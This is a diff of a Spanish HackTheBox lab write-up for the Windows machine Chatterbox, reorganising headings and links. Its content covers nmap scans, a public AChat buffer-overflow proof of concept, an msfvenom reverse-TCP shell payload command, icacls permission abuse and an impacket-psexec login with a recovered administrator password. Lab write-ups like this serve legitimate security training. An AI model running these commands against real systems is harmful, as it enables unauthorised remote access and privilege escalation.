@@ -1,19 +1,57 @@
-# Estadísticas
+---
+tags:
+  - Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)
+  - Generating a Shellcode based on our needs + TIPS
+  - Icacls Abuse (Privilege Escalation)
+  - PowerUp Enumeration (Alternative Privilege Escalation)
+---
+
+# Chatterbox <!-- omit from toc -->
+
+Write-up de la máquina Chatterbox de [HackTheBox](https://hackthebox.com).
+
+![Cover de Chatterbox](images/cover.png)
+
+## Índice <!-- omit from toc -->
+
+- [Introducción](#introducción)
+  - [Estadísticas](#estadísticas)
+- [Reconocimiento](#reconocimiento)
+  - [Escaneo de host](#escaneo-de-host)
+    - [Escaneo completo de puertos](#escaneo-completo-de-puertos)
+    - [Escaneo específico](#escaneo-específico)
+- [Enumeración](#enumeración)
+  - [Servicios](#servicios)
+    - [achat - 9255, 9256](#achat---9255-9256)
+      - [Manual](#manual)
+- [Explotación](#explotación)
+  - [Buffer Overflow - RCE](#buffer-overflow---rce)
+    - [Pasos previos | Preparación](#pasos-previos--preparación)
+    - [Ejecución](#ejecución)
+- [Post Explotación](#post-explotación)
+  - [Enumeración](#enumeración-1)
+  - [Escalación de privilegios](#escalación-de-privilegios)
+    - [alfred → nt authority system](#alfred--nt-authority-system)
+- [Referencias](#referencias)
+
+## Introducción
+
+### Estadísticas
 
 | Característica | Descripción |
 |---|---|
-| Nombre | [Chatterbox](https://www.hackthebox.com/home/machines/profile/123) |
+| Nombre | [Chatterbox](https://app.hackthebox.com/machines/Chatterbox) |
 | OS | Windows |
 | Dificultad oficial | Medium |
-| Dificultad de comunidad | ![Dificultad](images/difficulty.png) |
+| Dificultad de comunidad | ![Dificultad](images/diff.png) |
 | Puntos | 30 |
-| Creadores | [lkys37en](https://www.hackthebox.com/home/users/profile/709) |
+| Creadores | [lkys37en](https://app.hackthebox.com/users/709) |
 
-# Reconocimiento
+## Reconocimiento
 
-## Escaneo de host
+### Escaneo de host
 
-### Escaneo completo de puertos
+#### Escaneo completo de puertos
 
 ```bash
 └─$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET
@@ -55,7 +93,7 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 29.15 seconds
 ```
 
-### Escaneo específico
+#### Escaneo específico
 
 ```bash
 └─$ nmap -sCV -p 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 -n -Pn -oN nmap/targeted $TARGET
@@ -104,21 +142,21 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 70.63 seconds
 ```
 
-# Enumeración
+## Enumeración
 
-## Servicios
+### Servicios
 
-### achat - 9255, 9256
+#### achat - 9255, 9256
 
-#### Manual
+##### Manual
 
 Al buscar hacer un reconocimiento directamente por alguna versión vulnerable se encontró [este repositorio en github](https://github.com/mpgn/AChat-Reverse-TCP-Exploit) de una prueba de concepto sobre la explotación del programa, probado en su versión y arquitectura `AChat 0.150 Beta 7 Windows 7/8/10 x86/x64`. Por lo que directamente se probó el exploit.
 
-# Explotación
+## Explotación
 
-## Buffer Overflow - RCE
+### Buffer Overflow - RCE
 
-### Pasos previos | Preparación
+#### Pasos previos | Preparación
 
 Dadas las indicaciones en la PoC se generó el shellcode correspondiente usando:
 
@@ -128,15 +166,15 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp RHOST=$RHOST LHO
 
 Sustituyendo los valores correspondientes en el script del shellcode y host.
 
-### Ejecución
+#### Ejecución
 
 Obteniendo acceso como el usuario `alfred`.
 
 ![Acceso como usuario alfred](images/exploit_1.png)
 
-# Post Explotación
+## Post Explotación
 
-## Enumeración
+### Enumeración
 
 Posteriormente al ejecutar [winPEAS](https://github.com/carlospolop/PEASS-ng), se identificaron dos rutas potenciales a probar:
 
@@ -145,9 +183,9 @@ Posteriormente al ejecutar [winPEAS](https://github.com/carlospolop/PEASS-ng), s
 
 ![Rutas potenciales](images/post_1.png)
 
-## Escalación de privilegios
+### Escalación de privilegios
 
-### alfred &rarr; nt authority system
+#### alfred &rarr; nt authority system
 
 En el primer caso, bastaría con leer, escribir o ejecutar cualquier archivo dentro del directorio, si llegara a suceder que no se permite el acceso a un archivo bastaría con hacer uso de `icacls` para efectuar el cambio de permisos lo cual por herencia o jerarquía del directorio, se permitiría este cambio pudiendo así leer la bandera de `root.txt`.
 
@@ -171,7 +209,7 @@ impacket-psexec 'Administrator:Welcome1!@10.10.10.74'
 
 ![Acceso como nt authority system](images/post_3.png)
 
-# Referencias
+## Referencias
 
 - [AChat expoit](https://github.com/mpgn/AChat-Reverse-TCP-Exploit).
 - [Windows change access permissions from the command line](https://www.cyberciti.biz/tips/windows-change-access-permissions-from-the-command-line.html).
